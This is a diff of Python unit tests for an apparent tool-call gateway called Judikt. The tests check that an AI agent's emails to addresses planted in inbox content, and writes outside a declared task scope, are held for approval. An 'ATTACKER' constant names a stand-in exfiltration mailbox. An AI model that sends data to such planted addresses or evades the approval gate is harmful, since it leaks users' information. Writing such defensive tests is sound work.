@@ -15,14 +15,17 @@ PROJECT_ROOT = Path(__file__).resolve().parents[1]
 ATTACKER = "records-desk@exfil-mail.example"
 
 
-class GatewayProvenanceTest(unittest.TestCase):
-    def _runtime(self, directory: str, mode: str | None) -> JudiktRuntime:
+class MailFixture(unittest.TestCase):
+    def _runtime(
+        self, directory: str, mode: str | None, environment: dict[str, str] | None = None, **policy_extra: object
+    ) -> JudiktRuntime:
         policy = json.loads((PROJECT_ROOT / "config" / "policies.yaml").read_text())
         policy["allowed_tools"]["mail"] = ["read_inbox", "send_email"]
         for patterns in policy["actor_permissions"].values():
             patterns.extend(["read_inbox", "send_email"])
         if mode is not None:
             policy["untrusted_provenance"] = {"mode": mode}
+        policy.update(policy_extra)
         policy_path = Path(directory) / "policy.json"
         policy_path.write_text(json.dumps(policy))
         upstream_path = Path(directory) / "upstreams.json"
@@ -40,13 +43,15 @@ class GatewayProvenanceTest(unittest.TestCase):
                 }
             )
         )
-        environment = patch.dict(os.environ, {"JUDIKT_UPSTREAM_CONFIG": str(upstream_path)})
-        environment.start()
-        self.addCleanup(environment.stop)
+        patcher = patch.dict(os.environ, {"JUDIKT_UPSTREAM_CONFIG": str(upstream_path), **(environment or {})})
+        patcher.start()
+        self.addCleanup(patcher.stop)
         runtime = JudiktRuntime(policy_path, Path(directory) / "audit.db")
         self.addCleanup(runtime.close)
         return runtime
 
+
+class GatewayProvenanceTest(MailFixture):
     def test_send_to_an_address_planted_in_an_email_needs_approval(self) -> None:
         with tempfile.TemporaryDirectory() as directory:
             runtime = self._runtime(directory, None)
@@ -99,6 +104,17 @@ class GatewayProvenanceTest(unittest.TestCase):
             runtime.call_tool("mail", "read_inbox", {})
             self.assertTrue(runtime.call_tool("mail", "send_email", {"to": ATTACKER, "body": "x"}).allowed)
 
+    def test_an_address_in_a_data_field_is_not_tracked_by_default(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            runtime = self._runtime(directory, None)
+            runtime.call_tool("mail", "read_inbox", {})
+            self.assertTrue(runtime.call_tool("mail", "send_email", {"to": "sam@partner.example", "body": "thanks"}).allowed)
+        with tempfile.TemporaryDirectory() as directory:
+            runtime = self._runtime(directory, None, untrusted_provenance={"track": "everywhere"})
+            runtime.call_tool("mail", "read_inbox", {})
+            held = runtime.call_tool("mail", "send_email", {"to": "sam@partner.example", "body": "thanks"})
+            self.assertEqual(held.rule, "untrusted_provenance")
+
     def test_policy_files_reject_an_unknown_mode(self) -> None:
         policy = json.loads((PROJECT_ROOT / "config" / "policies.yaml").read_text())
         policy["untrusted_provenance"] = {"mode": "block"}
@@ -110,6 +126,56 @@ class GatewayProvenanceTest(unittest.TestCase):
             runtime = self._runtime(directory, None)
             runtime.call_tool("mail", "read_inbox", {})
             self.assertTrue(runtime.call_tool("mail", "read_inbox", {}).allowed)
+
+
+class GatewayTaskScopeTest(MailFixture):
+    """Reuses the mail fixture; provenance stays on, as in the default policy."""
+
+    def test_operator_scope_holds_writes_outside_it(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            runtime = self._runtime(directory, None, {"JUDIKT_TASK_WRITES": "none"})
+            held = runtime.call_tool("mail", "send_email", {"to": "boss@corp.example", "body": "hi"})
+            self.assertEqual((held.rule, held.action), ("task_scope", "REQUIRE_APPROVAL"))
+            self.assertIn("task_scope:mail/send_email", held.evidence)
+            self.assertTrue(runtime.call_tool("mail", "read_inbox", {}).allowed)
+            arguments = {"to": "boss@corp.example", "body": "hi"}
+            token = runtime.policy.issue_approval(
+                actor="reviewer", reason="checked", server="mail", tool="send_email", arguments=arguments
+            )
+            self.assertTrue(runtime.call_tool("mail", "send_email", {**arguments, "approval_token": token}).allowed)
+        with tempfile.TemporaryDirectory() as directory:
+            runtime = self._runtime(directory, None, {"JUDIKT_TASK_WRITES": "send_email"})
+            self.assertTrue(runtime.call_tool("mail", "send_email", {"to": "boss@corp.example", "body": "hi"}).allowed)
+
+    def test_agent_declares_before_reading_and_the_first_result_seals_it(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            runtime = self._runtime(directory, None, task_scope={"mode": "agent"})
+            accepted = runtime.pipeline.declare_task({"write_tools": ["send_email"], "purpose": "reply to Sam"})
+            self.assertFalse(accepted["isError"])
+            runtime.call_tool("mail", "read_inbox", {})
+            refused = runtime.pipeline.declare_task({"write_tools": ["send_email", "delete_repo"]})
+            self.assertTrue(refused["isError"])
+            self.assertTrue(runtime.call_tool("mail", "send_email", {"to": "boss@corp.example", "body": "hi"}).allowed)
+
+    def test_agent_that_never_declared_is_sealed_empty(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            runtime = self._runtime(directory, None, task_scope={"mode": "agent"})
+            self.assertTrue(runtime.call_tool("mail", "send_email", {"to": "boss@corp.example", "body": "hi"}).allowed)
+            runtime.call_tool("mail", "read_inbox", {})
+            held = runtime.call_tool("mail", "send_email", {"to": "boss@corp.example", "body": "hi"})
+            self.assertEqual(held.rule, "task_scope")
+
+    def test_the_declaration_tool_is_listed_only_in_agent_mode(self) -> None:
+        from judikt.catalog import ToolCatalog
+
+        with tempfile.TemporaryDirectory() as directory:
+            runtime = self._runtime(directory, None)
+            self.assertNotIn("judikt_declare_task", ToolCatalog(runtime).names())
+        with tempfile.TemporaryDirectory() as directory:
+            runtime = self._runtime(directory, None, task_scope={"mode": "agent"})
+            catalog = ToolCatalog(runtime, "sre-oncall")
+            self.assertIn("judikt_declare_task", {tool.name for tool in catalog.tools()})
+            self.assertEqual(catalog.server_for("judikt_declare_task"), "judikt")
 
 
 if __name__ == "__main__":
